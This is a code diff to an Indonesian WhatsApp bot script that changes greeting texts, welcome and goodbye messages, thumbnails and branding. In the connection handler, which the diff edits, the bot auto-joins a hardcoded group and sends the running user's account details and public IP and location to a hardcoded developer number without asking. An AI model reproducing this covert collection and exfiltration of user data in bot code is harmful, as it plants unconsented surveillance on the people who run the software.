@@ -21,19 +21,19 @@ const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
       var ucapanWaktu = "Selamat malam";
     }
     if (time2 < "19:00:00") {
-      var ucapanWaktu = "Selamat senja🌞";
+      var ucapanWaktu = "Selamat senja kak🌞";
     }
     if (time2 < "18:00:00") {
-      var ucapanWaktu = "Selamat sore🌄";
+      var ucapanWaktu = "Selamat sore kak🌄";
     }
     if (time2 < "15:00:00") {
-      var ucapanWaktu = "Selamat siang☀️";
+      var ucapanWaktu = "Selamat siang kak☀️";
     }
     if (time2 < "11:00:00") {
-      var ucapanWaktu = "Selamat pagi🌅";
+      var ucapanWaktu = "Selamat pagi kak🌅";
     }
     if (time2 < "05:00:00") {
-      var ucapanWaktu = "Selamat malam🌃";
+      var ucapanWaktu = "Selamat malam kak🌃";
     }
 const runtime = function (seconds) {
   seconds = Number(seconds);
@@ -110,11 +110,11 @@ await client.connect({ timeoutMs: 30 * 1000 });
  teks = `https://chat.whatsapp.com/YKG5RpbpQO96C`
  client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
- client.sendMessage(`6289503657396@s.whatsapp.net`, `*Hai Owner Realzi, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer REALZI",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/62858157008612?text=Assalamualaikum"}}})
+ client.sendMessage(`6289503657396@s.whatsapp.net`, `*Hai Owner Realzi, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer REALZI",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./zyy.jpg'),sourceUrl:"https://wa.me/62858157008612?text=Assalamualaikum"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       client.sendMessage("6289503657396@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Realzi",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/6289503657396?text=Assalamualaikum"}}})
+       client.sendMessage("6289503657396@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Realzi",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./zyy.jpg'),sourceUrl:"https://wa.me/6289503657396?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
@@ -202,7 +202,7 @@ if (anu.action == "add" && !mem.includes(client.user.jid)) {
         let v = client.contacts[num] || { notify: num.replace(/@.+/, "") };
         anu_user = v.vname || v.notify || num.split("@")[0];
         time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
-        teks = `*⌜ ᴡᴇʟᴄᴏᴍᴇ @${num.split('@')[0]}👋🏻 ɪɴ ɢʀᴜᴘ ${mdata.subject} ⌝*
+        teks = `*⌜ WELCOME @${num.split('@')[0]}👋🏻 IN GROUP ${mdata.subject} SEMOGA BETAH!!😇 ⌝*
 *╭⊷️ ɴᴀᴍᴀ :*
 *├ ᴜᴍᴜʀ :*
 *├ ᴀsᴋᴏᴛ :*
@@ -215,20 +215,20 @@ if (anu.action == "add" && !mem.includes(client.user.jid)) {
         buff = await getBuffer(
           `http://hadi-api.herokuapp.com/api/card/welcome2?nama=${encodeURI(anu_user)}&descriminator=${memeg}&memcount=${memeg}&gcname=${encodeURI(mdata.subject)}&gcicon=${pp_grup}&pp=${pp_user}&bg=${pp_grup}`
         );
-        client.sendMessage(anu.jid, { contentText: `${teks}`, footerText: `Welcome Messages by AlyaBot`, buttons: [{ buttonId: `Welcome👋🏻`, buttonText: { displayText: 'Welcome👋🏻' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: buff, contextInfo: {mentionedJid: [num]}}}, 'buttonsMessage')}
+        client.sendMessage(anu.jid, { contentText: `${teks}`, footerText: `Welcome Messages by Realzibotz`, buttons: [{ buttonId: `Welcome👋🏻`, buttonText: { displayText: 'Welcome👋🏻' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: buff, contextInfo: {mentionedJid: [num]}}}, 'buttonsMessage')}
             if (anu.action == "remove" && !mem.includes(client.user.jid)) {
         mdata = await client.groupMetadata(anu.jid);
-        tag = "6282182623238@s.whatsapp.net";
+        tag = "6289503657396@s.whatsapp.net";
         num = anu.participants[0];
         let w = client.contacts[num] || { notify: num.replace(/@.+/, "") };
         anu_user = w.vname || w.notify || num.split("@")[0];
         time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
         memeg = mdata.participants.length;
-        out = `*Selamat Tinggal @${num.split('@')[0]}*`;
+        out = `*Selamat Tinggal @${num.split('@')[0]} Gausah balik lagi kesini y😊*`;
         buff = await getBuffer(
           `http://hadi-api.herokuapp.com/api/card/goodbye2?nama=${encodeURI(anu_user)}&descriminator=${memeg}&memcount=${memeg}&gcname=${encodeURI(mdata.subject)}&gcicon=${pp_grup}&pp=${pp_user}&bg=${pp_grup}`
         );
-        client.sendMessage(anu.jid, { contentText: `${out}`, footerText: `Leaving Messages by AlyaBot`, buttons: [{ buttonId: `dada beban`, buttonText: { displayText: 'Byee👋🏻' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: buff, contextInfo: {mentionedJid: [num]}}}, 'buttonsMessage')
+        client.sendMessage(anu.jid, { contentText: `${out}`, footerText: `Leaving Messages by Realzibotz`, buttons: [{ buttonId: `dada beban`, buttonText: { displayText: 'Byee👋🏻' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: buff, contextInfo: {mentionedJid: [num]}}}, 'buttonsMessage')
       }
       /*welcom = true
       if (anu.action == "add" && !mem.includes(client.user.jid)) {
@@ -451,4 +451,4 @@ function uncache(module = ".") {
 }
 
 starts();
-// 𝙅𝙖𝙣 𝙃𝙖𝙥𝙪𝙨 𝘾𝙧𝙚𝙙𝙞𝙩 𝙂𝙬 𝘼𝙨𝙪𝙪𝙪
+// Jangan Hapus Credit Gua Ajg🗿
